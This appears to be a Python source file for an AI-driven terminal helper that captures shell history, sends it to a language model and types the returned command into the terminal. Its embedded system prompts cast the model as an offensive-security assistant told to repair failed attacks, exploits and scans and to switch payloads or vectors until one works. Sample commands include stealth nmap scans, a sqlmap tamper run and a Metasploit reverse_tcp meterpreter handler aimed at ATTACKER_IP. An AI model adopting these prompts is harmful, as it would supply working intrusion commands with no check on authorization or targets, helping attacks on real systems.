from yaspin import yaspin

spinner = yaspin()
spinner.start()

import os
import platform
import re
import subprocess
import sys
import time

import platformdirs
import pyperclip
import yaml

try:
    from pynput.keyboard import Controller, Key
except ImportError:
    spinner.stop()
    print("Please run `pip install pynput` to use the `wtf` command.")
    exit()

os.environ["LITELLM_LOCAL_MODEL_COST_MAP"] = "True"
import litellm


def is_termux():
    """Enhanced Termux detection."""
    return (
        os.getenv("TERMUX_VERSION") is not None
        or os.getenv("PREFIX") == "/data/data/com.termux/files/usr"
        or os.path.isfile("/data/data/com.termux/files/usr/bin/termux-info")
        or os.path.exists("/data/data/com.termux")
    )


def get_system_name():
    """Get system name for attack context."""
    if is_termux():
        return "Termux"
    if os.path.exists("/system/build.prop"):
        return "Android"
    return platform.system()


# OFFENSIVE SECURITY TROUBLESHOOTER PROMPTS

SYSTEM_MESSAGE = f"""
You are an offensive security debugging assistant. Your job: fix broken attacks, exploits, and recon commands.

**ANALYZE:**
1. Identify the failed attack/exploit/scan in the terminal history
2. Determine why it failed (wrong syntax, missing tool, bad payload, target defense)
3. Provide working alternative attack command

**RULES:**
- Provide ONE executable command that fixes the attack
- Use \\\ for multiline on Unix, ^ on Windows
- Ultra-brief explanation (1 sentence max)
- NO comments in code
- If attack failed, try different vector/payload/technique
- Focus on most recent failed operation
- Proper escaping for shell metacharacters

**ATTACK CONTEXT:**
- System: {get_system_name()}
- CWD: {os.getcwd()}
- Shell: {os.environ.get('SHELL', 'unknown')}
{"- Termux: Use pkg, /sdcard/ paths, termux-specific tools" if is_termux() else ""}

**EXAMPLE FIXES:**

Failed nmap scan → Different scan technique:
```bash
nmap -Pn -sS target.com
```

Failed SQLi → Different payload:
```bash
sqlmap -u "https://target.com?id=1" --batch --tamper=space2comment --level=3
```

Failed exploit → Alternative tool:
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; exploit"
```

**RESPOND WITH:**
[1 sentence: why it failed and what to try]
```bash
[working attack command]
```
"""

CUSTOM_MESSAGE_SYSTEM_MESSAGE = f"""
You are an offensive security assistant. User asked a specific hacking question.

**YOUR JOB:**
1. Read their question (after "wtf")
2. Provide working attack/exploit/recon command
3. Keep it brief and executable

**RULES:**
- ONE working command
- Ultra-brief explanation
- Proper escaping
- NO comments
- Address their EXACT question

**CONTEXT:**
- System: {get_system_name()}
- CWD: {os.getcwd()}
{"- Termux environment" if is_termux() else ""}

**FORMAT:**
[Brief answer to their question]
```bash
[executable command]
```
"""

LOCAL_SYSTEM_MESSAGE = f"""
Fast hacking troubleshooter. Fix the broken attack.

**PROCESS:**
1. Find failed attack/scan/exploit
2. Determine fix
3. Provide working command

**RULES:**
- One command (\\\ for multiline)
- Brief explanation
- No comments
- Proper escaping

**EXAMPLE:**
Nmap scan timed out. Try stealth scan.
```bash
nmap -sS -T2 -Pn target.com
```

**CONTEXT:**
- System: {get_system_name()}
- CWD: {os.getcwd()}
{"- Termux mode" if is_termux() else ""}
"""


def main():
    """Enhanced wtf for offensive security operations."""
    
    # Get custom query if provided
    custom_message = None
    if len(sys.argv) > 1:
        custom_message = "wtf " + " ".join(sys.argv[1:])

    # Get terminal history
    keyboard = Controller()
    history = None

    # Clipboard method
    try:
        clipboard = pyperclip.paste()
        shortcut_key = Key.cmd if (platform.system() == "Darwin" and not is_termux()) else Key.ctrl
        
        with keyboard.pressed(shortcut_key):
            keyboard.press("a")
            keyboard.release("a")
        
        with keyboard.pressed(shortcut_key):
            keyboard.press("c")
            keyboard.release("c")
        
        keyboard.press(Key.backspace)
        keyboard.release(Key.backspace)
        
        time.sleep(0.1)
        history = pyperclip.paste()
        pyperclip.copy(clipboard)
        
    except Exception as e:
        if os.getenv("DEBUG"):
            print(f"[DEBUG] Clipboard failed: {e}")

    # Shell history fallback
    if not history:
        try:
            output = subprocess.check_output(
                f"{os.environ.get('SHELL', '/bin/bash')} -c 'history -10'",
                shell=True,
                stderr=subprocess.STDOUT
            ).decode("utf-8")

            lines = output.strip().split("\n")
            history_lines = [
                l.strip() for l in lines 
                if l.strip() and "saving" not in l.lower()
            ][-10:]

            if history_lines:
                last_command = history_lines[-1]
                spinner.start()
                print(f"\nRe-running: {last_command}\n")
                spinner.stop()
                
                try:
                    last_output = subprocess.check_output(
                        last_command, shell=True, stderr=subprocess.STDOUT
                    ).decode("utf-8")
                except subprocess.CalledProcessError as e:
                    last_output = e.output.decode("utf-8")
                except Exception as e:
                    last_output = str(e)

                history = "Commands:\n" + "\n".join(history_lines)
                history += f"\n\nLast command output:\n{last_output}"

        except Exception as e:
            if os.getenv("DEBUG"):
                print(f"[DEBUG] History failed: {e}")
            history = f"CWD: {os.getcwd()}\nSystem: {get_system_name()}"

    # Clean history
    history = history[-9000:].strip()
    
    spinner_chars = ["⠴", "⠦", "⠇", "⠉", "⠙", "⠸", "⠼", "⠤", "⠂", "⠄", "⠈", "⠐", "⠠"]
    for char in spinner_chars:
        if history.endswith(char):
            history = history[:-len(char)].strip()
            break

    if "wtf" in history:
        last_wtf = history.rindex("wtf")
        history = history[:last_wtf]

    # Extract error context from files
    pattern = r'File "([^"]+)", line (\d+)'
    matches = re.findall(pattern, history)[-1:]

    def get_lines_from_file(filename, line_number):
        lines = []
        try:
            with open(filename, "r") as file:
                all_lines = file.readlines()
                start = max(0, line_number - 3)
                end = min(len(all_lines), line_number + 2)
                for i in range(start, end + 1):
                    lines.append(f"Line {i+1}: " + all_lines[i].rstrip())
        except Exception as e:
            lines.append(f"Error reading: {e}")
        return lines

    result = []
    for match in matches:
        filename, line_number = match
        line_number = int(line_number)
        lines = get_lines_from_file(filename, line_number)
        result.append({"filename": filename, "text": "\n".join(lines)})

    if result:
        history = "Terminal: " + history

    for entry in result:
        history = f"""File: {entry["filename"]}\n{entry["text"]}\n\n""" + history

    # Get model
    default_profile = os.path.join(
        platformdirs.user_config_dir("open-vulnera"), "profiles", "default.yaml"
    )

    try:
        with open(default_profile, "r") as f:
            profile = yaml.safe_load(f)
            model = profile.get("wtf", {}).get("model") or profile.get("llm", {}).get("model", "gpt-4o-mini")
    except:
        model = "gpt-4o-mini"

    # Select system message
    if "ollama" in model or "llama" in model:
        system_message = LOCAL_SYSTEM_MESSAGE
    else:
        system_message = SYSTEM_MESSAGE

    if custom_message:
        system_message = CUSTOM_MESSAGE_SYSTEM_MESSAGE
        user_message = (
            f"Question: {custom_message}\n\n"
            f"Terminal history:\n---\n{history}\n---\n\n"
            f"Answer with executable command: {custom_message}"
        )
    else:
        user_message = history.strip() + "\n\nFix the failed attack with a working command:"

    messages = [
        {"role": "system", "content": system_message.strip()},
        {"role": "user", "content": user_message.strip()},
    ]

    # Stream response and type command
    in_code = False
    backtick_count = 0
    language_buffer = ""
    started = False

    try:
        for chunk in litellm.completion(
            model=model, messages=messages, temperature=0, stream=True
        ):
            if not started:
                started = True
                spinner.stop()
                print("")

            content = chunk.choices[0].delta.content
            if content:
                for char in content:
                    if char == "`":
                        backtick_count += 1
                        if backtick_count == 3:
                            in_code = not in_code
                            backtick_count = 0
                            language_buffer = ""
                            if not in_code:
                                time.sleep(0.1)
                                print("\n")
                                return
                            else:
                                print("Press `enter` to execute: ", end="", flush=True)
                    elif in_code:
                        if language_buffer is not None:
                            if char.isalnum():
                                language_buffer += char
                            elif char.isspace():
                                language_buffer = None
                        elif char not in ["\n", "\\"]:
                            keyboard.type(char)
                    else:
                        if backtick_count:
                            print("`" * backtick_count, end="", flush=True)
                            backtick_count = 0
                        print(char, end="", flush=True)
                        backtick_count = 0

    except Exception as e:
        spinner.stop()
        print(f"\nError: {e}")
        if os.getenv("DEBUG"):
            import traceback
            traceback.print_exc()


if __name__ == "__main__":
    main()
